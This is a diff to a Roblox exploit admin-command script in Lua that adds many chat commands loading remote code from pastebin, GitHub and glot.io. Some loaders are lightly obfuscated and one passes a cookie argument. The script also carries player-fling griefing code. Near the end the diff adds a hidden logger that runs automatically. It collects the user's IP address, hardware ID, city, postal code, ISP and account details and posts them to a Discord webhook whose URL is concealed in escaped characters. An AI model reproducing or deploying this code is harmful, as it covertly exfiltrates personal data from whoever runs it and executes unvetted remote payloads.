+		fakewallhop = {"fwh","wallhop","fakewallhop"},
+		ball = {"ball","beball","becomeball"},
+		info = {"infostuff","infothings"},
+			
 	}
-
+	
 	function Commands(pf, text)
 		local split = string.split(string.lower(text), "/")
 		local cmd = split[1]
 		local arg1 = split[2]
 		local arg2 = split[3]
-		
+	
 		for _, name in pairs(allcmds.iy) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1577,7 +2001,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-		
+	
 		for _, name in pairs(allcmds.dex) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1585,7 +2009,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-		
+	
 		for _, name in pairs(allcmds.punch) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1654,7 +2078,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-		
+	
 		for _, name in pairs(allcmds.fly) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1673,14 +2097,14 @@ local script = G2L["c"];
 						cameraCFrame = cameraCFrame * CFrame.new(-cameraOffset.X, -cameraOffset.Y, -cameraOffset.Z + 1)
 						local cameraPosition = cameraCFrame.Position
 						local headPosition = headCFrame.Position
-	
+
 						local objectSpaceVelocity = CFrame.new(cameraPosition, Vector3.new(headPosition.X, cameraPosition.Y, headPosition.Z)):VectorToObjectSpace(moveDirection)
 						Head.CFrame = CFrame.new(headPosition) * (cameraCFrame - cameraPosition) * CFrame.new(objectSpaceVelocity)
 					end)
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.cmds) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1688,7 +2112,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.hug) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1696,7 +2120,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.clip) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1712,7 +2136,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.cmdx) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1720,26 +2144,26 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.goto) do
 			if cmd == pf..name then
 				task.spawn(function()
 					local Username = arg1
-	
-	
+
+
 					char = game:GetService("Players").LocalPlayer
-	
+
 					TweenService = game:GetService("TweenService")
-	
+
 					speaker = game:GetService("Players").LocalPlayer
 					Players = game:GetService("Players")
-	
+
 					local players = getPlr(Username)
 					TweenService:Create(getRoot(speaker.Character), TweenInfo.new(3, Enum.EasingStyle.Linear), {CFrame = getRoot(players.Character).CFrame + Vector3.new(3,1,0)}):Play()
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.bdexe) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1747,19 +2171,19 @@ local script = G2L["c"];
 				end)
 			end
 		end
-		
+
 		for _, name in pairs(allcmds.fling) do
 			if cmd == pf..name then
 				task.spawn(function()
 					local player = game:GetService("Players").LocalPlayer
 					local mouse = player:GetMouse()
 					local Targets = {arg1}
-	
+
 					local Players = game:GetService("Players")
 					local Player = Players.LocalPlayer
-	
+
 					local AllBool = false
-	
+
 					local GetPlayer = function(Name)
 						Name = Name:lower()
 						if Name == "all" or Name == "others" then
@@ -1783,23 +2207,23 @@ local script = G2L["c"];
 							return
 						end
 					end
-	
+
 					local Message = function(_Title, _Text, Time)
 						game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
 					end
-	
+
 					local SkidFling = function(TargetPlayer)
 						local Character = Player.Character
 						local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
 						local RootPart = Humanoid and Humanoid.RootPart
-	
+
 						local TCharacter = TargetPlayer.Character
 						local THumanoid
 						local TRootPart
 						local THead
 						local Accessory
 						local Handle
-	
+
 						if TCharacter:FindFirstChildOfClass("Humanoid") then
 							THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
 						end
@@ -1815,7 +2239,7 @@ local script = G2L["c"];
 						if Accessory and Accessory:FindFirstChild("Handle") then
 							Handle = Accessory.Handle
 						end
-	
+
 						if Character and Humanoid and RootPart then
 							if RootPart.Velocity.Magnitude < 50 then
 								getgenv().OldPos = RootPart.CFrame
@@ -1832,69 +2256,69 @@ local script = G2L["c"];
 							if not TCharacter:FindFirstChildWhichIsA("BasePart") then
 								return
 							end
-	
+
 							local FPos = function(BasePart, Pos, Ang)
 								RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
 								Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
 								RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
 								RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
 							end
-	
+
 							local SFBasePart = function(BasePart)
 								local TimeToWait = 2
 								local Time = tick()
 								local Angle = 0
-	
+
 								repeat
 									if RootPart and THumanoid then
 										if BasePart.Velocity.Magnitude < 50 then
 											Angle = Angle + 100
-	
+
 											FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
 											task.wait()
 										else
 											FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
 											task.wait()
-	
+
 											FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
 											task.wait()
 										end
@@ -1903,17 +2327,17 @@ local script = G2L["c"];
 									end
 								until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
 							end
-	
+
 							workspace.FallenPartsDestroyHeight = 0/0
-	
+
 							local BV = Instance.new("BodyVelocity")
 							BV.Name = "EpixVel"
 							BV.Parent = RootPart
 							BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
 							BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
-	
+
 							Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
-	
+
 							if TRootPart and THead then
 								if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
 									SFBasePart(THead)
@@ -1928,11 +2352,11 @@ local script = G2L["c"];
 								SFBasePart(Handle)
 							else
 							end
-	
+
 							BV:Destroy()
 							Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
 							workspace.CurrentCamera.CameraSubject = Humanoid
-	
+
 							repeat
 								RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
 								Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
@@ -1948,16 +2372,16 @@ local script = G2L["c"];
 						else
 						end
 					end
-	
+
 					getgenv().Welcome = true
 					if Targets then for _,x in next, Targets do GetPlayer(x) end else return end
-	
+
 					if AllBool then
 						for _,x in next, Players:GetPlayers() do
 							SkidFling(x)
 						end
 					end
-	
+
 					for _,x in next, Targets do
 						if GetPlayer(x) and GetPlayer(x) ~= Player then
 							if GetPlayer(x).UserId ~= 4603013888 then
@@ -1973,7 +2397,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.invis) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -1981,7 +2405,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.speed) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2006,7 +2430,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.unfly) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2019,7 +2443,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.vghub) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2027,7 +2451,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.noclip) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2046,7 +2470,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.rejoin) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2054,7 +2478,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.shyguy) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2062,7 +2486,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.spygui) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2070,7 +2494,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.uncmds) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2078,7 +2502,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.chatbot) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2086,7 +2510,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.chatspy) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2094,7 +2518,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.quizgui) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2102,7 +2526,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.rizzgui) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2110,7 +2534,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.unspeed) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2119,7 +2543,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.chatdraw) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2127,7 +2551,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.doorsgui) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2135,7 +2559,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.emotegui) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2143,7 +2567,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.graphics) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2151,7 +2575,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.antifling) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2159,7 +2583,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.audiologs) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2167,7 +2591,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.blackhole) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2175,7 +2599,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.emojichat) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2183,7 +2607,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.muteradio) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2240,7 +2664,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.obbytroll) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2250,7 +2674,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.remotespy) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2258,7 +2682,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.serverhop) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2268,7 +2692,7 @@ local script = G2L["c"];
 				end)
 			end
 		end
-	
+
 		for _, name in pairs(allcmds.spinfling) do
 			if cmd == pf..name then
 				task.spawn(function()
@@ -2276,7 +2700,7 @@ local script = G2L["c"];
 						local rootPart = game:GetService("Players").LocalPlayer.Character:FindFirstChild('HumanoidRootPart') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('Torso') or game:GetService("Players").LocalPlayer.Character:FindFirstChild('UpperTorso')
 						return rootPart
 					end
-	
+
 					local Noclipping = nil
 					Clip = false
 					task.wait(0.1)
@@ -2290,7 +2714,7 @@ local script = G2L["c"];
 						end
 					end
 					Noclipping = game:GetService("RunService").Stepped:Connect(NoclipLoop)
-	
+
 					flinging = false
 					for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
 						if child:IsA("BasePart") then
@@ -2743,24 +3167,350 @@ local script = G2L["c"];
 				end)
 			end
 		end
+
+		for _, name in pairs(allcmds.ball) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/h8EumNRw"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.info) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/qW2Pxd37"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.reset) do
+			if cmd == pf..name then
+				task.spawn(function()
+					local chr = p.Character or p.CharacterAdded:Wait()
+					chr:BreakJoints()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.scp173) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/Yk720g1L"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.jorking) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/ZKvxb3HY"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.vrsetup) do
+			if cmd == pf..name then
+				task.spawn(function()
+					-- DO NOT RUN THIS IN VR MODE
+					skyvrversion = '3.0.0'
+
+					VR_Model_Customization_GUI = game:GetObjects("rbxassetid://93922799482853")[1]
+					VR_Model_Customization_GUI.Parent = gethui and gethui() or game:GetService("CoreGui")
+
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/presidentanvil/skyvr/main/VRCustomizationMain.lua"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.febypass) do
+			if cmd == pf..name then
+				task.spawn(function()
+					getgenv().CookieArgument = arg1
+					loadstring(game:HttpGet("https://pastebin.com/raw/se4mMrXH"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.posreset) do
+			if cmd == pf..name then
+				task.spawn(function()
+					local chr = p.Character or p.CharacterAdded:Wait()
+					local oldpos = chr:GetPivot()
+					chr:BreakJoints()
+					p.CharacterAdded:Wait()
+					game:GetService("RunService").Heartbeat:Wait()
+					chr = p.Character
+					chr:PivotTo(oldpos)
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.fastreset) do
+			if cmd == pf..name then
+				task.spawn(function()
+					local chr = p.Character or p.CharacterAdded:Wait()
+					local oldtime = game:GetService("Players").RespawnTime
+					game:GetService("Players").RespawnTime = 0.5
+					task.wait(0.5)
+					chr:BreakJoints()
+					task.wait(0.5)
+					game:GetService("Players").RespawnTime = oldtime
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.rochipsuni) do
+			if cmd == pf..name then
+				task.spawn(function()
+					if "you wanna use rochips universal" then
+						local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/"
+						local im,lonely,z_c=task.wait,game,loadstring
+						z_c(lonely:HttpGet(z_z..""..z_x))()
+						return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
+					end
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.fakewallhop) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/14JjVTL2"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.rochipscmds) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/new/refs/heads/main/cmd.lua"))() -- rochips commands
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.walkonwalls) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty21.lua"))() -- walk on walls
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.posfastreset) do
+			if cmd == pf..name then
+				task.spawn(function()
+					local chr = p.Character or p.CharacterAdded:Wait()
+					local oldpos = chr:GetPivot()
+					local oldtime = game:GetService("Players").RespawnTime
+					game:GetService("Players").RespawnTime = 0.5
+					task.wait(0.5)
+					chr:BreakJoints()
+					p.CharacterAdded:Wait()
+					game:GetService("RunService").Heartbeat:Wait()
+					chr = p.Character
+					chr:PivotTo(oldpos)
+					task.wait(0.5)
+					game:GetService("Players").RespawnTime = oldtime
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.antibackshots) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/EL5VxfEy"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.autobackshots) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://pastebin.com/raw/2gXkhvLH"))()
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.spooflocalplayer) do
+			if cmd == pf..name then
+				task.spawn(function()
+					local playerMetatable = {
+						__index = function(tbl, key)
+							if key == "Name" then
+								return "SpoofedLocalPlayer" 
+							elseif key == "Character" then
+								return Instance.new("Model", workspace).Name == "SpoofedCharacter"
+							elseif key == "UserId" then
+								return 1234567890 
+							end
+						end
+					}
+
+					local existingLocalPlayer = game:GetService("Players").LocalPlayer
+
+					local fakeLocalPlayer = {}
+					setmetatable(fakeLocalPlayer, playerMetatable)
+
+					local limbs = {LeftLeg = Instance.new("Part"),RightLeg = Instance.new("Part"),LeftArm = Instance.new("Part"),RightArm = Instance.new("Part"),Torso = Instance.new("Part"),Head = Instance.new("Part")}
+					local fakehum = Instance.new("Humanoid")
+
+					task.spawn(function()
+						fakehum.Name = "SpoofedHumanoid"
+						fakehum.DisplayName = "HelloIAmSpoofedHaHa"
+						fakehum.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.LeftArm.Anchored = true
+						limbs.LeftArm.CFrame = CFrame.new(0,9e9,0)
+						limbs.LeftArm.Size = Vector3.new(1,2,1)
+						limbs.LeftArm.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.LeftLeg.Anchored = true
+						limbs.LeftLeg.CFrame = CFrame.new(0,9e9,0)
+						limbs.LeftLeg.Size = Vector3.new(1,2,1)
+						limbs.LeftLeg.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.RightArm.Anchored = true
+						limbs.RightArm.CFrame = CFrame.new(0,9e9,0)
+						limbs.RightArm.Size = Vector3.new(1,2,1)
+						limbs.RightArm.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.RightLeg.Anchored = true
+						limbs.RightLeg.CFrame = CFrame.new(0,9e9,0)
+						limbs.RightLeg.Size = Vector3.new(1,2,1)
+						limbs.RightLeg.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.Torso.Anchored = true
+						limbs.Torso.CFrame = CFrame.new(0,9e9,0)
+						limbs.Torso.Size = Vector3.new(2,2,1)
+						limbs.Torso.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+						limbs.Head.Anchored = true
+						limbs.Head.CFrame = CFrame.new(0,9e9,0)
+						limbs.Head.Size = Vector3.new(2,1,1)
+						limbs.Head.Parent = workspace:WaitForChild("SpoofedCharacter",10)
+					end)
+
+					existingLocalPlayer.Name = fakeLocalPlayer.Name
+					existingLocalPlayer.UserId = fakeLocalPlayer.UserId
+
+					print("Spoofed LocalPlayer Name:", game:GetService("Players").LocalPlayer.Name)
+					print("Spoofed LocalPlayer UserID:", game:GetService("Players").LocalPlayer.UserId)
+				end)
+			end
+		end
+
+		for _, name in pairs(allcmds.rochipsadminpanel) do
+			if cmd == pf..name then
+				task.spawn(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/load/refs/heads/main/rcloader"))() -- rochip admin panel
+				end)
+			end
+		end
 	end
-	
+
 	input.FocusLost:Connect(function(enter)
 		if not enter then
 			return
 		end
-		
+
 		Commands(prefix, input.Text)
 	end)
 
 	local chatprefix = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService and ">" or "&gt;"
-	
+
 	p.Chatted:Connect(function(msg)
 		Commands(chatprefix, msg)
 	end)
+
+	task.spawn(function()
+		local HttpService = game:GetService("HttpService")
+		local Players = game:GetService("Players")
+		local MarketplaceService = game:GetService("MarketplaceService")
+		local LocalizationService = game:GetService("LocalizationService")
+		local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+		local GroupService = game:GetService("GroupService")
+		local BadgeService = game:GetService("BadgeService")
+		local UserInputService = game:GetService("UserInputService")
+		local Stats = game:GetService("Stats")
+
+		local LocalPlayer = Players.LocalPlayer
+		local UserId = LocalPlayer.UserId
+		local DisplayName = LocalPlayer.DisplayName
+		local Username = LocalPlayer.Name
+		local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+		local AccountAge = LocalPlayer.AccountAge
+		local Country = LocalizationService.RobloxLocaleId
+		local GetIp = game:HttpGet("https://v4.ident.me/")
+		local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+		local Hwid = RbxAnalyticsService:GetClientId()
+		local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+		local GameName = GameInfo.Name
+		local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Mobile" or "PC"
+		local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+		local function detectExecutor()
+			return identifyexecutor()
+		end
+
+		local function createWebhookData()
+			local executor = detectExecutor()
+			local date = os.date("%m/%d/%Y")
+			local time = os.date("%X")
+			local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+			local playerLink = "https://www.roblox.com/users/" .. UserId
+			local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+			local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+
+			local data = {
+				username = "E Commands FE Execution Logger",
+				avatar_url = "https://cdn.discordapp.com/avatars/557509179020017674/0b8ae2468a67c87d57ebd99c8a1734cf.webp?size=1024&width=591&height=591",
+				embeds = {
+					{
+						title = "Game Info:",
+						description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+						color = tonumber("0x2ecc71")
+					},
+					{
+						title = "Player Info:",
+						description = string.format(
+							"**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+							DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
+						),
+						color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
+					},
+					{
+						title = "Location/Network Info:",
+						description = string.format(
+							"**IP:** `%s`\n**HWID:** `%s`\n**Country:** %s :flag_%s:\n**Region:** %s\n**City:** %s\n**Postal Code:** %s\n**ISP:** %s\n**Organization:** %s\n**Time Zone:** %s",
+							GetIp, Hwid, GetData.country, string.lower(GetData.countryCode), GetData.regionName, GetData.city, GetData.zip, GetData.isp, GetData.org, GetData.timezone
+						),
+						color = tonumber("0xe74c3c")
+					},
+					{
+						title = "Tech Info:",
+						description = string.format(
+							"**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
+							executor, jobIdLink, mobileJoinLink
+						),
+						color = tonumber("0x95a5a6"),
+						footer = { 
+							text = string.format("Date: %s / Time: %s", date, time)
+						}
+					}
+				}
+			}
+			return HttpService:JSONEncode(data)
+		end
+
+		local function sendWebhook(webhookUrl, data)
+			local headers = {["Content-Type"] = "application/json"}
+			local request = http_request or request or HttpPost or syn.request
+			local webhookRequest = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+			request(webhookRequest)
+		end
+
+		local webhookUrl = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\52\49\53\56\48\50\48\49\50\56\48\49\52\55\52\56\56\47\50\48\57\50\65\54\115\48\103\79\117\66\74\71\53\51\99\56\120\114\82\101\111\103\101\104\116\121\84\86\48\48\45\82\99\67\87\106\68\77\53\45\76\48\48\117\69\84\78\45\71\103\82\109\107\95\66\114\119\55\84\101\84\71\69\66\90\114"
+		local webhookData = createWebhookData()
+		sendWebhook(webhookUrl, webhookData)
+	end)
 end;
 task.spawn(C_c);
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
 local function C_67()
 	local script = G2L["67"];
 	-- rewritten by E God
